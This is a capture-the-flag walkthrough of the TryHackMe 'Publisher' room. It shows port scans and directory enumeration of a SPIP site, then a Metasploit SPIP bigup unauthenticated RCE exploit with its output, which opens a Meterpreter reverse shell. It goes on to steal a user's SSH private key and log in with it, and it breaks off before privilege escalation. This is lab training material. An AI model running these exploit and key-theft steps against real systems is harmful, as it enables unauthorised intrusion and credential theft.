https://tryhackme.com/r/room/publisher


Scan all open TCP ports on target machine
```
root@ip-10-10-239-8:~# nmap -p- 10.10.166.246
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-12 20:39 GMT
Nmap scan report for 10.10.166.246
Host is up (0.00044s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:15:0F:B7:95:61 (Unknown)
```

Scan specific open TCP ports for vulnerabilities and version
```
root@ip-10-10-239-8:~# nmap -p 22,80 -sVC 10.10.166.246 
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-12 20:41 GMT
Nmap scan report for 10.10.166.246
Host is up (0.00014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
MAC Address: 02:15:0F:B7:95:61 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Run directory enumeration on the found http server in port 80
```
root@ip-10-10-239-8:~/Documents# gobuster dir -u http://10.10.166.246 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.166.246
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://10.10.166.246/images/]
/server-status        (Status: 403) [Size: 278]
/spip                 (Status: 301) [Size: 313] [--> http://10.10.166.246/spip/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
results show a spip directory that looks uncommon
You can navigate to that directory and it shows you a spip CMS application running on the server

The next logical step is to enumerate through those directories as well. 
```
root@ip-10-10-239-8:~/Documents# gobuster dir -u http://10.10.166.246/spip/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.166.246/spip/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/LICENSE              (Status: 200) [Size: 35147]
/config               (Status: 301) [Size: 320] [--> http://10.10.166.246/spip/config/]
/ecrire               (Status: 301) [Size: 320] [--> http://10.10.166.246/spip/ecrire/]
/local                (Status: 301) [Size: 319] [--> http://10.10.166.246/spip/local/]
/prive                (Status: 301) [Size: 319] [--> http://10.10.166.246/spip/prive/]
/squelettes-dist      (Status: 301) [Size: 329] [--> http://10.10.166.246/spip/squelettes-dist/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.166.246/spip/tmp/]
/vendor               (Status: 301) [Size: 320] [--> http://10.10.166.246/spip/vendor/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
A few random directories are revealed. It's best to go through each one to see if they have anything interesting in them. 
Within the /ecrire directory there's an admin login page. 

When looking up spip with searchsploit you can view all of the common POC vulns for the application. 
Lets turn on msfconsole to see if there are any vulnerabilities on there that we can easily utilize.
```
searchsploit spip
msfconsole
```

The first option is spip_bigup_unath_rce
Lets set the options and exploit the webpage hosting the spip admin login page. 
```
msf6 exploit(multi/http/spip_bigup_unauth_rce) > set targeturi /spip 
targeturi => /spip
msf6 exploit(multi/http/spip_bigup_unauth_rce) > exploit 

[*] Started reverse TCP handler on 10.10.239.8:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: EKNOtMYqq/6ugfpn9CwZU...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (40004 bytes) to 10.10.166.246
[*] Meterpreter session 1 opened (10.10.239.8:4444 -> 10.10.166.246:45292) at 2025-01-12 21:23:43 +0000

meterpreter > 
```
We were able to successfully get an metepreter shell with the exploit

We then enumerate the shell the machine. 
Check who we're currently logged in as. 
Display the contents and path of the current directory 
When navigating to the think home directory we can see that we're given permissions to read the user.txt flag
```
whoami 
ls -al 
cd /home/think
ls -al 
cat user.txt
```

We now have elevate our privileges to root somehow
First I noticed that I can download the id_rsa ssh private key of the think user to the host machine when inside the meterpreter.
```
cd /home/think/.ssh
download id_rsa
```
Now that I've downloaded the cert to my local machine I can use it to remotely login to the victim machine

From my kali machine is copy the ssh private key from the home directory into the /.ssh dir
I then need to change the permission of the file for it to be used in the ssh command. 
I can log in as user "think" now
```
cp id_rsa /root/.ssh/
chmod 600 id_rsa 
ssh -i id_rsa think@10.10.166.246
```

Not sure what to do now to elevate privileges since I don't know the users password. 
A possibility is to install linpeas or pyops to check for any vulnerable configurations on the target machine. 
I'll try that later.... 